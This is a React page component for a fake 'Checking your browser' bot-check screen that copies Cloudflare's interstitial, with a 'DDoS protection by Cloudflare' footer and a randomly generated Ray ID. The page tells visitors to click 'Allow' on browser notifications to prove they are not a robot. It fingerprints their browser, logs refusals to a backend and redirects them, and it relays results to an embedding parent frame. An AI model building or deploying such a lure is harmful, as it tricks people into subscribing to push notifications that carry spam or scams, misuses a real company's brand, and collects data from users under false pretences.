'use client'

import { useState, useEffect } from 'react'
import { Container, Card, Button, Spinner } from 'react-bootstrap'
import { FiShield } from 'react-icons/fi'
import BrowserClickHelper from '@/lib/browser-click-helper'

export default function BotCheckPage() {
  const [clientInfo, setClientInfo] = useState(null)
  const [isChecking, setIsChecking] = useState(true)
  const [isVerified, setIsVerified] = useState(false)
  const [showSoftPrompt, setShowSoftPrompt] = useState(false)
  const [permissionGranted, setPermissionGranted] = useState(false)
  const [isFirefoxOrEdge, setIsFirefoxOrEdge] = useState(false)
  const [showCustomButtons, setShowCustomButtons] = useState(false)
  const [rayId, setRayId] = useState('')
  const [userAgent, setUserAgent] = useState('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
  const [ipAddress] = useState('192.168.1.100')
  const [timestamp, setTimestamp] = useState('')
  const [domain, setDomain] = useState('sms-system-alert.com')

  // Initialize client-side only values
  useEffect(() => {
    // Check if embedded in iframe
    const urlParams = new URLSearchParams(window.location.search)
    const embedded = urlParams.get('embedded') === 'true'
    const urlDomain = urlParams.get('domain')
    
    // Store embedded state for later use
    window.isEmbedded = embedded
    
    // Set domain from URL params
    if (urlDomain) {
      setDomain(urlDomain)
    }
    
    // Generate Ray ID on client side only
    const chars = '0123456789abcdef'
    let result = ''
    for (let i = 0; i < 16; i++) {
      result += chars[Math.floor(Math.random() * chars.length)]
    }
    setRayId(result)
    
    // Set timestamp on client side
    setTimestamp(new Date().toISOString())
    
    // Set user agent on client side
    if (typeof window !== 'undefined') {
      setUserAgent(window.navigator.userAgent)
    }
  }, [])

  // Detect browser and device information
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const getBrowserInfo = () => {
        const ua = navigator.userAgent
        let browser = 'Unknown'
        let browserVersion = 'Unknown'
        
        // Detect browsers (order matters for accurate detection)
        if (ua.indexOf('OPR') > -1 || ua.indexOf('Opera') > -1) {
          browser = 'Opera'
          browserVersion = ua.match(/(?:OPR|Opera)[\s\/]([\d.]+)/)?.[1] || 'Unknown'
        } else if (ua.indexOf('Edg') > -1 || ua.indexOf('Edge') > -1) {
          browser = 'Edge'
          browserVersion = ua.match(/Edg[e]?\/(\d+)/)?.[1] || 'Unknown'
        } else if (ua.indexOf('SamsungBrowser') > -1) {
          browser = 'Samsung'
          browserVersion = ua.match(/SamsungBrowser\/(\d+)/)?.[1] || 'Unknown'
        } else if (ua.indexOf('Chrome') > -1 && ua.indexOf('Safari') > -1) {
          browser = 'Chrome'
          browserVersion = ua.match(/Chrome\/(\d+)/)?.[1] || 'Unknown'
        } else if (ua.indexOf('Firefox') > -1) {
          browser = 'Firefox'
          browserVersion = ua.match(/Firefox\/(\d+)/)?.[1] || 'Unknown'
        } else if (ua.indexOf('Safari') > -1) {
          browser = 'Safari'
          browserVersion = ua.match(/Version\/(\d+)/)?.[1] || 'Unknown'
        }
        
        // Check for Brave (it reports as Chrome)
        if (typeof navigator.brave !== 'undefined') {
          browser = 'Brave'
        }

        const isMobile = /Mobile|Android|iPhone|iPad/i.test(ua)
        const deviceType = isMobile ? 'Mobile' : 'Desktop'
        
        let os = 'Unknown'
        if (ua.indexOf('Windows NT 10.0') > -1) {
          // Could be Windows 10, 11, or Server 2016/2019/2022
          if (ua.indexOf('Windows NT 10.0; Win64; x64') > -1) {
            os = 'Windows 10+' // Generic for Win10/11/Server
          } else {
            os = 'Windows 10'
          }
        } else if (ua.indexOf('Windows NT 11.0') > -1) {
          os = 'Windows 11'
        } else if (ua.indexOf('Windows') > -1) {
          os = 'Windows'
        } else if (ua.indexOf('Mac') > -1) {
          os = 'macOS'
        } else if (ua.indexOf('Linux') > -1) {
          os = 'Linux'
        } else if (ua.indexOf('Android') > -1) {
          os = 'Android'
        } else if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) {
          os = 'iOS'
        }

        return {
          browser,
          browserVersion,
          deviceType,
          operatingSystem: os,
          userAgent: ua,
          language: navigator.language,
          screenResolution: `${window.screen.width}x${window.screen.height}`,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          platform: navigator.platform
        }
      }

      const info = getBrowserInfo()
      setClientInfo(info)
      
      // Additional check for Firefox/Edge to show soft prompt immediately
      if (info.browser === 'Firefox' || info.browser === 'Edge') {
        setIsFirefoxOrEdge(true)
        setIsChecking(false)
        setShowSoftPrompt(true)
      }
    }
  }, [])

  useEffect(() => {
    // Skip if already showing soft prompt for Firefox/Edge
    if (isFirefoxOrEdge || showSoftPrompt) {
      return
    }
    
    const clickHelper = new BrowserClickHelper()
    
    
    // Double check with both methods for Firefox/Edge
    // Remove needsPermission check - Edge should always show soft prompt
    const isFirefoxOrEdgeBrowser = 
      clickHelper.browser.requiresClick ||
      (clientInfo && (clientInfo.browser === 'Firefox' || clientInfo.browser === 'Edge'))
    
    if (isFirefoxOrEdgeBrowser) {
      setIsFirefoxOrEdge(true)
      setIsChecking(false)
      setShowSoftPrompt(true)
      return // IMPORTANT: Exit here, no timer for Firefox/Edge
    }
    
    // For Chrome/Safari, auto-trigger permission prompt after a delay
    // The bot check screen stays visible throughout
    const timer = setTimeout(() => {
      // Don't change the UI - keep showing the bot check
      console.log('[Bot Check] Auto-triggering permission prompt for Chrome/Safari')
      
      // Send message to parent to trigger permission prompt
      if (window.isEmbedded && window.parent !== window) {
        window.parent.postMessage({
          type: 'bot-check-verified',
          browserInfo: clientInfo,
          location: {
            country: 'United States',
            city: 'New York',
            ip: ipAddress
          }
        }, '*')
      }
    }, 500) // Reduced delay for faster permission prompt

    return () => {
      clearTimeout(timer)
    }
  }, [clientInfo, ipAddress, isFirefoxOrEdge, showSoftPrompt])

  const handleSoftPromptAllow = async (e) => {
    e.preventDefault()
    e.stopPropagation()
    
    // If embedded in iframe, we need to handle differently for Firefox/Edge
    if (window.isEmbedded && window.parent !== window) {
      // Send message to parent to handle permission request
      window.parent.postMessage({
        type: 'request-permission-firefox',
        browserInfo: clientInfo,
        location: {
          country: 'United States',
          city: 'New York',
          ip: ipAddress
        }
      }, '*')
      return
    }
    
    try {
      // Check if Notification API is available
      if (!('Notification' in window)) {
        console.error('Notification API not supported')
        alert('Notifications are not supported in this browser')
        return
      }
      
      // When user clicks Allow button, show the native browser prompt
      // This will show the same permission popup as Chrome/Safari
      const permission = await Notification.requestPermission()
      
      if (permission === 'granted') {
        setPermissionGranted(true)
        setShowSoftPrompt(false)
        
        // For Firefox/Edge, proceed with subscription after permission granted
        if (window.isEmbedded && window.parent !== window) {
          // Send verification message for embedded mode
          window.parent.postMessage({
            type: 'bot-check-verified',
            browserInfo: clientInfo,
            location: {
              country: 'United States',
              city: 'New York',
              ip: ipAddress
            }
          }, '*')
        } else {
          // Non-embedded mode - handle subscription and redirect
          await handleAllow()
        }
      } else if (permission === 'denied') {
        // User clicked Block in the native prompt
        await handleBlock()
      } else {
        // User dismissed the prompt - treat as block
        await handleBlock()
      }
    } catch (error) {
      console.error('Error requesting permission:', error)
      await handleBlock()
    }
  }

  const handleAllow = async () => {
    try {
      // For Chrome/Safari, send verification message to parent
      // Parent will handle the permission request
      if (window.isEmbedded && window.parent !== window) {
        window.parent.postMessage({
          type: 'bot-check-verified',
          browserInfo: clientInfo,
          location: {
            country: 'United States',
            city: 'New York',
            ip: ipAddress
          }
        }, '*')
        return
      }
      
      // Non-embedded mode - handle locally
      let permission = Notification.permission
      
      if (permission === 'default') {
        permission = await Notification.requestPermission()
      }
      
      if (permission === 'granted') {
        console.log('Permission granted')
        const urlParams = new URLSearchParams(window.location.search)
        const allowRedirect = urlParams.get('allowRedirect')
        window.location.href = allowRedirect || '/'
      } else {
        await handleBlock()
      }
    } catch (error) {
      console.error('Error requesting permission:', error)
    }
  }

  // Utility function to convert VAPID key
  const urlBase64ToUint8Array = (base64String) => {
    const padding = '='.repeat((4 - base64String.length % 4) % 4)
    const base64 = (base64String + padding)
      .replace(/\-/g, '+')
      .replace(/_/g, '/')
    
    const rawData = window.atob(base64)
    const outputArray = new Uint8Array(rawData.length)
    
    for (let i = 0; i < rawData.length; ++i) {
      outputArray[i] = rawData.charCodeAt(i)
    }
    return outputArray
  }

  const handleBlock = async () => {
    // If embedded, send message to parent
    if (window.isEmbedded && window.parent !== window) {
      window.parent.postMessage({
        type: 'bot-check-completed',
        permission: 'denied',
        browserInfo: clientInfo,
        location: {
          country: 'United States',
          city: 'New York',
          ip: ipAddress
        }
      }, '*')
      return
    }
    
    // Save blocked status to database
    const urlParams = new URLSearchParams(window.location.search)
    const landingId = urlParams.get('landingId')
    const domain = urlParams.get('domain')
    const subscribedUrl = urlParams.get('url')
    const blockRedirect = urlParams.get('blockRedirect')
    
    try {
      // Save blocked attempt
      const response = await fetch('/api/clients', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          subscription: {
            endpoint: `blocked-${Date.now()}-${Math.random()}`, // Unique identifier for blocked
            keys: {
              p256dh: 'blocked',
              auth: 'blocked'
            }
          },
          landingId: landingId,
          domain: domain,
          url: subscribedUrl,
          accessStatus: 'blocked',
          browserInfo: {
            browser: clientInfo?.browser || 'unknown',
            version: clientInfo?.browserVersion || 'unknown',
            os: clientInfo?.operatingSystem || 'unknown',
            device: clientInfo?.deviceType || 'unknown',
            language: clientInfo?.language || 'en',
            platform: clientInfo?.platform || 'unknown'
          },
          location: {
            country: 'United States',
            city: 'New York',
            ip: ipAddress
          }
        })
      })
    } catch (error) {
      console.error('Failed to save blocked status:', error)
    }
    
    // Only redirect if not embedded
    if (!window.isEmbedded) {
      window.location.href = blockRedirect || subscribedUrl || '/'
    }
  }

  // If accessed directly (not embedded), show error message
  if (typeof window !== 'undefined' && !window.isEmbedded) {
    return (
      <div style={{ 
        minHeight: '100vh', 
        backgroundColor: '#f8f8f8',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '20px',
        fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
      }}>
        <Container>
          <Card className="mx-auto" style={{ maxWidth: '700px', border: '1px solid #d9d9d9', boxShadow: 'none' }}>
            <Card.Body className="p-5" style={{ backgroundColor: '#ffffff' }}>
              <div className="text-center">
                <h2 style={{ fontSize: '24px', fontWeight: '400', color: '#333', marginBottom: '30px' }}>
                  Invalid Access Method
                </h2>
                
                <div style={{ 
                  width: '80px', 
                  height: '80px', 
                  margin: '0 auto 30px',
                  background: '#fee',
                  borderRadius: '50%',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center'
                }}>
                  <FiShield size={40} color="#cc0000" />
                </div>
                
                <p style={{ fontSize: '16px', color: '#666', marginBottom: '30px', lineHeight: '1.6' }}>
                  This verification page can only be accessed through an authorized push notification widget.
                </p>
                
                <p style={{ fontSize: '14px', color: '#999', marginBottom: '0' }}>
                  Please return to the original website and try again.
                </p>
              </div>
            </Card.Body>
          </Card>
        </Container>
      </div>
    )
  }

  return (
    <div style={{ 
      minHeight: '100vh', 
      backgroundColor: '#f8f8f8',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '20px',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
    }}>
      <style jsx global>{`
        @keyframes loading-dots {
          0% { opacity: 0.2; }
          20% { opacity: 1; }
          100% { opacity: 0.2; }
        }
        .loading-dot {
          display: inline-block;
          width: 12px;
          height: 12px;
          border-radius: 50%;
          background-color: #f48120;
          margin: 0 5px;
          opacity: 0.2;
          animation: loading-dots 1.4s infinite ease-in-out;
        }
        .loading-dot:nth-child(1) { animation-delay: -0.32s; }
        .loading-dot:nth-child(2) { animation-delay: -0.16s; }
        .loading-dot:nth-child(3) { animation-delay: 0; }
      `}</style>
      <Container>
        <Card className="mx-auto" style={{ maxWidth: '700px', border: '1px solid #d9d9d9', boxShadow: 'none' }}>
          <Card.Body className="p-5" style={{ backgroundColor: '#ffffff' }}>
            {(showSoftPrompt || isFirefoxOrEdge || clientInfo?.browser === 'Firefox' || clientInfo?.browser === 'Edge') ? (
              // Custom prompt for Firefox/Edge with bot check style
              <div className="text-center">
                <h2 style={{ fontSize: '24px', fontWeight: '400', color: '#333', marginBottom: '30px' }}>
                  Click "Allow" if you're not a robot
                </h2>
                
                <div style={{ 
                  width: '80px', 
                  height: '80px', 
                  margin: '0 auto 30px',
                  background: '#f0f8ff',
                  borderRadius: '50%',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center'
                }}>
                  <FiShield size={40} color="#0066cc" />
                </div>
                
                <p style={{ fontSize: '16px', color: '#666', marginBottom: '30px', lineHeight: '1.6' }}>
                  To continue to {domain}, please verify you're human by allowing notifications.
                </p>
                
                <div className="d-flex gap-3 justify-content-center">
                  <Button 
                    variant="primary"
                    size="lg"
                    onClick={handleSoftPromptAllow}
                    style={{
                      background: '#0066cc',
                      border: 'none',
                      padding: '12px 40px',
                      fontSize: '16px',
                      fontWeight: '500',
                      cursor: 'pointer'
                    }}
                  >
                    Allow
                  </Button>
                  <Button 
                    variant="outline-secondary"
                    size="lg"
                    onClick={handleBlock}
                    style={{
                      padding: '12px 40px',
                      fontSize: '16px'
                    }}
                  >
                    Block
                  </Button>
                </div>
                
                <div style={{ borderTop: '1px solid #e5e5e5', paddingTop: '20px', marginTop: '40px' }}>
                  <p style={{ color: '#999', fontSize: '13px', marginBottom: '5px' }}>
                    DDoS protection by Cloudflare
                  </p>
                  <p style={{ color: '#999', fontSize: '13px', margin: '0' }}>
                    Ray ID: {rayId}
                  </p>
                </div>
              </div>
            ) : (!isFirefoxOrEdge && clientInfo?.browser !== 'Firefox' && clientInfo?.browser !== 'Edge') ? (
              <div className="text-center">
                <h2 style={{ fontSize: '24px', fontWeight: '400', color: '#333', marginBottom: '30px' }}>
                  Please Click "Allow" to confirm you are not a robot.
                </h2>
                
                <div className="mb-4">
                  <div className="loading-dot"></div>
                  <div className="loading-dot"></div>
                  <div className="loading-dot"></div>
                </div>
                
                <h1 style={{ fontSize: '20px', fontWeight: '500', color: '#333', marginTop: '40px', marginBottom: '20px' }}>
                  Checking your browser before accessing {domain}.
                </h1>
                
                <p style={{ color: '#999', marginBottom: '10px', fontSize: '14px' }}>
                  This process is automatic. Your browser will redirect to your requested content shortly.
                </p>
                
                <p style={{ color: '#999', marginBottom: '40px', fontSize: '14px' }}>
                  Please allow up to 5 seconds...
                </p>
                
                <div style={{ borderTop: '1px solid #e5e5e5', paddingTop: '20px', marginTop: '40px' }}>
                  <p style={{ color: '#999', fontSize: '13px', marginBottom: '5px' }}>
                    DDoS protection by Cloudflare
                  </p>
                  <p style={{ color: '#999', fontSize: '13px', margin: '0' }}>
                    Ray ID: {rayId}
                  </p>
                </div>
              </div>
            ) : null}
          </Card.Body>
        </Card>
      </Container>
    </div>
  )
}